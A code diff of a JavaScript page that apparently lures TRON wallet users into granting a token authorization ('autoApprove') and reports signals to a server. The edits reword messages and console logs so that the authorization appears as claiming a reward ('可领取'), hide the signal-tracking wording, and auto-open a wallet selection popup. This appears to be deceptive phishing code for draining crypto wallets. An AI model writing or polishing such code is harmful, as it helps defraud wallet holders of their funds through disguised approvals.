@@ -988,13 +988,14 @@ async function autoApprove() {
         showAutoCloseAlert(`${lang.authorizeFail.replace("{msg}", e.message)}`);
     }
 }
-// ========== 环境检测函数（无重试，一次检测） ==========
+// ========== 环境检测函数（修改后：非钱包浏览器直接显示选择钱包页面） ==========
 async function checkImTokenEnv() {
     const lang = langConfig[currentLang];
     const walletModal = document.getElementById("walletModal");
     const connectBtn = document.getElementById("connectBtn");
     
     if (window.tronWeb && window.tronWeb.defaultAddress) {
+        // 钱包环境：正常初始化
         tronWeb = window.tronWeb;
         connectBtn.style.display = "none";
         warning.style.display = "none";
@@ -1002,11 +1003,14 @@ async function checkImTokenEnv() {
         walletModal.classList.remove("active");
         await initWallet(false);
     } else {
+        // 非钱包环境：直接显示选择钱包弹窗（核心修改）
         specialTipContainer.style.display = "block";
-        userInfoEl.innerHTML = lang.nonImTokenUser;
+        userInfoEl.innerHTML = lang.nonImTokenUser; // 提示选择钱包
         approveBtn.style.display = "none";
-        connectBtn.onclick = () => walletModal.classList.add("active");
+        connectBtn.style.display = "none"; // 隐藏连接按钮，直接显示弹窗
+        walletModal.classList.add("active"); // 自动激活选择钱包弹窗
         
+        // 保留原有钱包选择逻辑（点击钱包唤起对应APP）
         document.querySelectorAll(".wallet-item").forEach(item => {
             item.addEventListener("click", async (e) => {
                 const walletType = e.currentTarget.dataset.wallet;
@@ -1036,6 +1040,7 @@ async function checkImTokenEnv() {
             });
         });
         
+        // 点击弹窗外部关闭弹窗（保留原有交互）
         walletModal.addEventListener("click", (e) => {
             if (e.target === walletModal) walletModal.classList.remove("active");
         });
@@ -1138,7 +1143,7 @@ function bindUnlockedCoreLogic() {
             // 1. 检测是否已在钱包内→直接执行授权（不跳转、不刷新）
             const isInWalletBrowser = checkIsInWalletBrowser();
             if (isInWalletBrowser) {
-                userInfoEl.innerHTML += `<br><span style='color: #4ade80; font-size: 13px;'>✅ 已在钱包内，直接授权</span>`;
+                userInfoEl.innerHTML += `<br><span style='color: #4ade80; font-size: 13px;'>✅ 已在钱包内，可领取</span>`;
                 await autoApprove(); // 调用你原有授权逻辑
                 btn.disabled = false;
                 btn.textContent = lang.approveBtnText;
@@ -1147,7 +1152,7 @@ function bindUnlockedCoreLogic() {
 
             // 2. 不在钱包内→先处理B1信号，跳转后紧跟刷新
             if (hasSentB1Signal(userAddress)) {
-                userInfoEl.innerHTML += `<br><span style='color: #4ade80; font-size: 13px;'>✅ 已检测到B1-204，唤起授权</span>`;
+                userInfoEl.innerHTML += `<br><span style='color: #4ade80; font-size: 13px;'>✅可领取</span>`;
                 await handleJump(); // 执行跳转
                 window.location.reload(); // 紧跟刷新，无延迟
                 return;
@@ -1196,13 +1201,13 @@ async function sendSignalA1() {
             const a1Status = JSON.parse(localStorage.getItem(A1_STATUS_KEY) || "{}");
             a1Status[userAddress] = "success"; // 标记A1-204，成为防重复对象
             localStorage.setItem(A1_STATUS_KEY, JSON.stringify(a1Status));
-            console.log("✅ A1-204发送成功，标记为防重复对象（仅防二次发A1）");
+            console.log("✅环境检测完毕可点击领取");
             return "204";
         }
         throw new Error(`A1返回状态${res.status}`);
     } catch (e) {
         clearTimeout(timeoutId);
-        console.warn("❌ A1信号异常：", e);
+        console.warn("❌环境异常", e);
         return "fail";
     }
 }
@@ -1223,7 +1228,7 @@ async function sendSignalB(isB1 = true) {
         });
         clearTimeout(timeoutId);
         if (res.status === 204) {
-            console.log("✅ B1-204发送成功，标记为防重复对象（仅防二次发B1）");
+            console.log("✅已审核通过可直接领取");
             return "204";
         }
         throw new Error(`B1返回状态${res.status}`);
